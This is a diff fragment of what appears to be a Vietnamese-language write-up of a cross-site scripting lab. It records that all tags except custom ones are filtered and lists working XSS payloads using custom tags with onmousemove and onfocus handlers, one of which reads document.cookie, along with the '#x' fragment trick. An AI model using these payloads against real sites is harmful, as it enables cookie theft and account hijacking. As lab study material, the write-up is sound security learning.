@@ -346,19 +346,23 @@ Thử `<body onresize="print()" onload="window.resizeTo(800,600)"></body>` thì 
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/ffba47a3-fb46-45b6-a463-186bd11d8e01)
 
+Tất cả đều bị lọc trừ cái custom:
 
+![image](https://github.com/user-attachments/assets/f580f7b1-6d95-454f-bef0-ebbe56dce8e0)
 
+Sau khi thử 1 đống payload thì chạy được payload `<custom tags onmousemove="alert(1)" style=display:block>test</custom tags>` là ngon rồi
 
+![image](https://github.com/user-attachments/assets/88b325a3-f549-4230-a5fe-ce4f10e8d1b8)
 
+Tôi tìm được quả payload `<custom id=x onfocus=alert(document.cookie) tabindex=1>` này hay phết 
 
+![image](https://github.com/user-attachments/assets/8e656d8f-d588-498b-8ce1-16fe0a37d544)
 
+Tôi gà quá nghĩ không ra, xem solution thì thấy có thêm cả #x vào cuối payload 
 
-
-
-
-
-
+![image](https://github.com/user-attachments/assets/1775a5da-1692-4c16-b743-253e8eae0fb4)
 
 
 
